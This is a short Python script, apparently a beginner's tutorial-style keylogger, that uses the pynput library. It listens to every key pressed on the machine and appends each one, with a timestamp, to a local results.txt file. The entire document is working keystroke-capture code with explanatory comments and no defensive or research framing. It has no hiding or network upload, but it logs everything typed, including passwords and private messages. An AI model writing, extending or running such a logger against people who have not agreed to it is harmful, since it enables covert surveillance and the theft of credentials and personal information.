from pynput import keyboard
from datetime import datetime

results = []
def save(results): # this function add to the txt file the results list and the very accurate current datetime
    with open("results.txt", "a") as f: # this line tells to python to 'add' something in results.txt
         f.write(f"\n{results}{datetime.now()}") # adding results list + current_datetime

def on_press(key): # when a char is pressed : 
    results.append(key) # this char is added to the results list
    save(results) # we launch the save function
    results.clear() # once the file saved, we clear the list in order to avoid to spam the txt file with the previous results

with keyboard.Listener( # this part is the listener, this allows to keep running this script and at the same time to listen to the user's keyboard 
        on_press=on_press) as listener:
        listener.join()